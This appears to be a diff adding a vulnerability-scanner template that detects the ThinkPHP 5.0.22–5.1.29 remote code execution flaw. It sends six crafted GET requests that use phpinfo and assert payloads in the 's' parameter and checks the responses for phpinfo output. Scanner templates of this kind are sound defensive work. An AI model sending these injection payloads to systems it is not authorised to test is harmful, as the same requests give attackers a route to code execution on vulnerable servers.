@@ -1,0 +1,40 @@
+id: thinkphp-5024-5130-rce
+
+info:
+  name: ThinkPHP 5.0.22 TO 5.1.29  RCE
+  author: lark-lab
+  severity: critical
+  description: A vulnerability in ThinkPHP allows remote unauthenticated attackers to cause the product to execute arbitrary code via the 's' parameter.
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: "/?s=index/\\think\\Request/input&filter[]=phpinfo&data=-1"
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r1:
+    request:
+      method: GET
+      path: "/?s=index/\\think\\request/input?data[]=phpinfo()&filter=assert"
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r00:
+    request:
+      method: GET
+      path: "/?s=admin/\\think\\Request/input&filter[]=phpinfo&data=-1"
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r11:
+    request:
+      method: GET
+      path: "/?s=admin/\\think\\request/input?data[]=phpinfo()&filter=assert"
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r000:
+    request:
+      method: GET
+      path: "/?s=api/\\think\\Request/input&filter[]=phpinfo&data=-1"
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+  r111:
+    request:
+      method: GET
+      path: "/?s=api/\\think\\request/input?data[]=phpinfo()&filter=assert"
+    expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+expression: r0() || r1() || r00() || r11() || r000() || r111()
